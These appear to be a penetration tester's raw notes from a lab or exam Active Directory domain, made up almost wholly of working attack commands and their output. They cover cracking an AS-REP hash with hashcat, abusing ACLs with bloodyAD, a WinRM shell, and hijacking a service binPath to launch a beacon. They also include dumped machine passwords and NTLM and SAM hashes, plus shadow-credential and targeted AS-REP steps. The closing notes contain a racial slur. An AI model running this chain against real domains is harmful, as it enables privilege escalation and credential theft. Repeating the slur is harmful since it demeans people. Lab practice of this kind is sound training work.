Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

$krb5asrep$23$j.hernandez@ANDROMEDA.EXAM:243c02a1f217de7ef35639d94a817f59$84e0af0cb8389fd081d470019bc9ae69b689d5e674f1b11c4bfcbd4edd1bfc27d816bd267cee5c7a052e3042f9dec5dd5af714c9fbf9d0df6f2031f16bd82f60719157c7060d4dd1904a3adc641c7a5b8adb9d81afdbcecb33f4051ffc53c6deabd12228a8925705474e8e6fffbd08bb78e4bece821dc0c99a1af87b8caa9a4d9acbbc35060117e6b17050bf1eff8cc45ade7dfbcc235a92c61576bf7c3b42c1bba3a2728fd2e1ade8f1391c3312c35cc3bd2d4eecc669b6670ae92aa45bc68faf7bd2fbccb43213d5b53a59ea6e911cff800ebf283174d2c823f8879bbf68597493f3f0a9720216f8676bdb91eaf353:super1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$j.hernandez@ANDROMEDA.EXAM:243c02a1f2...eaf353
Time.Started.....: Thu Jul 31 15:19:29 2025 (0 secs)
Time.Estimated...: Thu Jul 31 15:19:29 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   864.9 kH/s (1.48ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> iheartyou
Hardware.Mon.#1..: Util: 25%

Started: Thu Jul 31 15:19:28 2025
Stopped: Thu Jul 31 15:19:31 2025



```


```python
kali@kali ~/w/a/w200 [2]> bloodyAD -t 10 --host 10.30.10.100 -d andromeda -u J.HERNANDEZ  -p super1 add genericAll "CN=Training,CN=Users,DC=andromeda,DC=exam" async_pentester-1
[+] async_pentester-1 has now GenericAll on CN=Training,CN=Users,DC=andromeda,DC=exam
```


```python
kali@kali ~/w/a/w200> bloodyAD -t 10 --host 10.30.10.100 -d andromeda -u async_pentester-1  -p 4SynC-s3cur1ty-l4bs add groupMember TRAINING async_pentester-1
[+] async_pentester-1 added to TRAINING
```



### SRV02

```
[*]	  Username : SRV02$
[*]	  Password : S@U!IvJEF>\U/a[%[wVZPQN]E_h"\$>_Y:9s\U55E0bTBNa]<0:x(E+m$V`NR)hR]>D+X!Hd&gI8OFxwtpbA8feVB:Mdgntm#r0@D-\tjq_3f\lMtz?RuW#]
```


```
kali@kali ~/w/a/w200> nxc winrm 10.30.10.0/24 -u 'async_pentester-1' -p '4SynC-s3cur1ty-l4bs' 
WINRM       10.30.10.100    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:andromeda.exam) 
WINRM       10.30.10.102    5985   SRV02            [*] Windows Server 2022 Build 20348 (name:SRV02) (domain:andromeda.exam) 
WINRM       10.30.10.101    5985   DEV01            [*] Windows Server 2022 Build 20348 (name:DEV01) (domain:andromeda.exam) 
WINRM       10.30.10.100    5985   DC01             [-] andromeda.exam\async_pentester-1:4SynC-s3cur1ty-l4bs
WINRM       10.30.10.102    5985   SRV02            [-] andromeda.exam\async_pentester-1:4SynC-s3cur1ty-l4bs
WINRM       10.30.10.101    5985   DEV01            [+] andromeda.exam\async_pentester-1:4SynC-s3cur1ty-l4bs (Pwn3d!)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```


```
kali@kali ~/w/a/w200> evil-winrm  -i 10.30.10.101 -u 'async_pentester-1' -p '4SynC-s3cur1ty-l4bs'
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\async_pentester-1\Documents> 
```


```
*Evil-WinRM* PS C:\Users\async_pentester-1\Documents> whoami /priv                                        

PRIVILEGES INFORMATION                               
----------------------                                                                                    
                                                                                                          
Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```


```xml
<?xml version='1.0' encoding='utf-8'?>
<unattend xmlns="urn:schemas-microsoft-com:unattend"> 
    <settings pass="generalize" wasPassProcessed="true">
        <component name="Microsoft-Windows-Security-SPP" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/
2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <SkipRearm>1</SkipRearm>                                                                      
        </component>
        <component name="Microsoft-Windows-PnpSysprep" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/20
02/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <PersistAllDeviceInstalls>true</PersistAllDeviceInstalls>
            <DoNotCleanUpNonPresentDevices>true</DoNotCleanUpNonPresentDevices>
        </component>
    </settings>
    <settings pass="oobeSystem" wasPassProcessed="true">
        <component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIC
onfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <InputLocale>en-US</InputLocale>
            <SystemLocale>en-US</SystemLocale>
            <UILanguage>en-US</UILanguage>
            <UserLocale>en-US</UserLocale>
        </component>
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Enabled>true</Enabled>
                <Username>localuser</Username>
                <Password>*SENSITIVE*DATA*DELETED*</Password>
            </AutoLogon>
            <OOBE>
                <HideLocalAccountScreen>true</HideLocalAccountScreen>
                <HideOEMRegistrationScreen>true</HideOEMRegistrationScreen>
                <HideOnlineAccountScreens>true</HideOnlineAccountScreens>
                <NetworkLocation>Work</NetworkLocation>
                <!-- 1: Specifies that important and recommended updates are installed automatically.
                     2: Specifies that only important updates are installed.
                     3: Specifies that automatic protection is disabled. Updates are available manually through Windows Update. -->
                <ProtectYourPC>3</ProtectYourPC>
                <HideEULAPage>true</HideEULAPage>
                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
            </OOBE>
            <UserAccounts>
                <!-- Server specific setting -->
                <AdministratorPassword>*SENSITIVE*DATA*DELETED*</AdministratorPassword>
                <!-- End server specific setting -->
                <LocalAccounts>
                    <LocalAccount wcm:action="add">
                        <Password>*SENSITIVE*DATA*DELETED*</Password>
                        <Description>LocalUser</Description>
                        <DisplayName>localuser</DisplayName>
                        <Group>Administrators</Group>
                        <Name>localuser</Name>
                    </LocalAccount>
                </LocalAccounts>
            </UserAccounts>
        </component>
    </settings>
    <settings pass="specialize" wasPassProcessed="true">
    </settings>

```



```
PS C:\Users\async_pentester-1> sc.exe sdshow eventlog

D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;LCLO;;;AC)

```


```
PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name                                                                                                                                                                                      
----                 -------------         ------ ----
d-----          5/8/2021   4:34 PM                Common Files
d-----          3/3/2022  11:58 AM                Internet Explorer
d-----         7/28/2025  10:54 PM                Microsoft
d-----         7/28/2025  10:55 PM                Microsoft SQL Server
d-----         7/28/2025  10:54 PM                Microsoft Visual Studio 10.0
d-----         7/28/2025  10:54 PM                Microsoft.NET
d-----          5/8/2021   4:20 PM                ModifiableWindowsApps
d-----         6/23/2025   7:45 PM                Qemu-ga
d-----         6/23/2025   7:46 PM                Red Hat
d-----         6/23/2025   7:46 PM                Spice Agent
d-----         6/23/2025   7:46 PM                Virtio-Win
d-----         7/28/2025  10:19 PM                Windows Defender
d-----          3/3/2022  11:58 AM                Windows Defender Advanced Threat Protection
d-----          3/3/2022  11:58 AM                Windows Mail
d-----          3/3/2022  11:58 AM                Windows Media Player
d-----          5/8/2021   5:35 PM                Windows NT
d-----          3/3/2022  11:58 AM                Windows Photo Viewer
d-----          5/8/2021   4:34 PM                WindowsPowerShell                                                                                                                                                                     
```


```
PS C:\projects> ConvertFrom-SddlString "D:(A;;CCLCSWLOCRRC;;;AU)" | Format-List *


Owner            : 
Group            : 
DiscretionaryAcl : {NT AUTHORITY\Authenticated Users: AccessAllowed (CreateDirectories, GenericExecute, ListDirectory, Read, ReadAttributes, ReadExtendedAttributes, ReadPermissions, WriteAttributes)}
SystemAcl        : {}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```



```
PS C:\temp> .\code.exe test
Service Access Rights for test:
  All Access: No
  Read Control: No
  Change Config: Yes
  Enumerate Depends: No
  Can Interrogate: No
  Can Pause/Continue: No
  Can Query Config: Yes
  Can Query Status: Yes
  Can Start: Yes
  Can Stop: Yes
  Can Define Control: No
```



```
PS C:\Users\async_pentester-1> sc.exe config Test binPath="C:\Temp\beacon2.exe"
[SC] ChangeServiceConfig SUCCESS
PS C:\Users\async_pentester-1> sc.exe start test

SERVICE_NAME: test
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2296
        FLAGS              :
PS C:\Users\async_pentester-1>

```




![[Notes-20250731232201270.webp|982]]





```
[*]	  Domain   : andromeda.exam
[*]	  Username : DEV01$
[*]	  Password : .,cKAHv@7\O^s]iy4\-MSqC@R24(;c.Hq%ixumO+n3QJmn-9(W^af JVu`U1vO\VENH%1k?\*'vcsq:W-XwiStYnO^:u6,[s3KNH5yA0Ac<pG03 O8/5i[ka

```



```
Authentication Id : 0 ; 36908 (00000000:0000902c)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/28/2025 11:52:45 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : DEV01$
	 * Domain   : andromeda
	 * NTLM     : 196a2bfddfb4a16369eca0e47b93a18d
	 * SHA1     : 2aa0d0693b4f758e1ff683c60f5891f53a7aa689
```


```
kali@kali ~/w/a/w200> nxc smb 10.30.10.101 -k --use-kcache --sam
SMB         10.30.10.101    445    DEV01            [*] Windows Server 2022 Build 20348 x64 (name:DEV01) (domain:andromeda.exam) (signing:True) (SMBv1:False) 
SMB         10.30.10.101    445    DEV01            [+] andromeda.exam\Administrator from ccache (Pwn3d!)
SMB         10.30.10.101    445    DEV01            [*] Dumping SAM hashes
SMB         10.30.10.101    445    DEV01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:cd602606c1367c2424856d51d57aa6fe:::
SMB         10.30.10.101    445    DEV01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.30.10.101    445    DEV01            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.30.10.101    445    DEV01            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e5b51d17ea3f15bf40144a02eb35d066:::
SMB         10.30.10.101    445    DEV01            [+] Added 4 SAM hashes to the database
```


---




```
kali@kali ~ [1]> bloodyAD --host 10.30.10.100 -d andromeda -u async_pentester-1 -p 4SynC-s3cur1ty-l4bs  add shadowCredentials J.HERNANDEZ
[+] KeyCredential generated with following sha256 of RSA key: a7f39f5f36009b96ef925434de39320e00bbb9b784dda4aad26009c2bb87f501
[-] PKINIT failed on DC 10.30.10.100, you must find a Kerberos server with a certification authority!
[+] PKINIT PFX certificate saved at: j.hernandez_No.pfx
Traceback (most recent call last):
  File "/home/kali/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 553, in shadowCredentials
    raise e
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 546, in shadowCredentials
    tgs, enctgs, key, decticket = client.U2U()
                                  ~~~~~~~~~~^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/minikerberos/client.py", line 471, in U2U
    self.get_TGT()
    ~~~~~~~~~~~~^^                                                                                                                                                                                                 
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/minikerberos/client.py", line 310, in get_TGT                                                                                     
    raise e                                                                                                                                                                                                        
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/minikerberos/client.py", line 306, in get_TGT                                                                                     
    preauth_rep = self.do_preauth(etype, with_pac=with_pac)                                                                                                                                                        
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/minikerberos/client.py", line 182, in do_preauth                                                                                  
    rep = self.ksoc.sendrecv(req.dump())                                                                                                                                                                           
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv                                                                       
    raise KerberosError(krb_message)                                                                                                                                                                               
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_CLIENT_REVOKED Detail: "Client’s credentials have been revoked"                                                                                   
```


```
kali@kali ~ [1]> bloodyAD --host '10.30.10.100' --username 'async_pentester-1' --password '4SynC-s3cur1ty-l4bs' add uac 'J.HERNANDEZ' -f 'DONT_REQ_PREAUTH'
[-] ['DONT_REQ_PREAUTH'] property flags added to J.HERNANDEZ's userAccountControl
```


```python
kali@kali ~> bloodyAD --host 10.30.10.100 -d andromeda.exam -u 'async_pentester-1' -p '4SynC-s3cur1ty-l4bs' remove uac J.HERNANDEZ -f ACCOUNTDISABLE
Traceback (most recent call last):
  File "/home/kali/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/remove.py", line 288, in uac
    conn.ldap.bloodymodify(
    ~~~~~~~~~~~~~~~~~~~~~~^
        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 315, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=Jack Hernandez,CN=Users,DC=andromeda,DC=exam! Result code: "unwillingToPerform" Reason: "b'0000052D: SvcErr: DSID-031A1260, problem 5003 (WILL_NOT_PERFORM), data 0\n\x00'"

```






- ldap signing / binding enabled
- channel binding disabled

# things to reset

- UAC of that nigger, targetted asrep
- im reading not processing
- methodology
	- practice
	- once you add a user make sure to check what this user has access to change everything. literally everything, protocols.
	- 

